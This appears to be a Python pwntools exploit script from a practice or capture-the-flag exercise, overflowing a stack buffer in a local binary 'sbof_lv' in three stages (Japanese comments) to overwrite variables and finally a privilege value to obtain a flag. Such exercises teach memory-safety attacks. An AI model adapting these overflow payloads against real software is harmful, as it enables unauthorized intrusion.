#!/usr/bin/env python3
from pwn import *
import sys
import struct

bin_file = './sbof_lv'
context(os = 'linux', arch = 'amd64')

context.binary = bin_file
context.terminal = ['bash', 'splitw', '-h']  # 環境に応じて変えてください
context.log_level = 'debug'  # または 'info'

binf = ELF(bin_file)

# selectの書き換え
def attack_35_9(conn, **kwargs):
    exploit = 'a'*0x10+'H4cked!'
    conn.sendline(exploit)
    print(conn.recvall().decode())

# keyの書き換え
def attack_35_10(conn, **kwargs):
    exploit =  b'a' * 0x10 + b'H4cked!'.ljust(0x14, b'\x00')
    exploit += b'\xef\xbe\xad\xde'
    conn.sendline(exploit)
    print(conn.recvall().decode())

# privの書き換え →フラグ取得成功
def attack_35_11(conn, **kwargs):
    exploit =  b'a' * 0x10 + b'H4cked!'.ljust(0x14, b'\x00')
    exploit += struct.pack('<IQ', 0xdeadbeef, 0x40204b)
    conn.sendline(exploit)
    print(conn.recvall().decode())

def main():

    print('### attack_35_9 ###')
    conn = process(bin_file)
    attack_35_9(conn)
    
    print('### attack_35_10 ###')
    conn = process(bin_file)
    attack_35_10(conn)
    
    print('### attack_35_11 ###')
    conn = process(bin_file)
    attack_35_11(conn)

if __name__=='__main__':
    main()
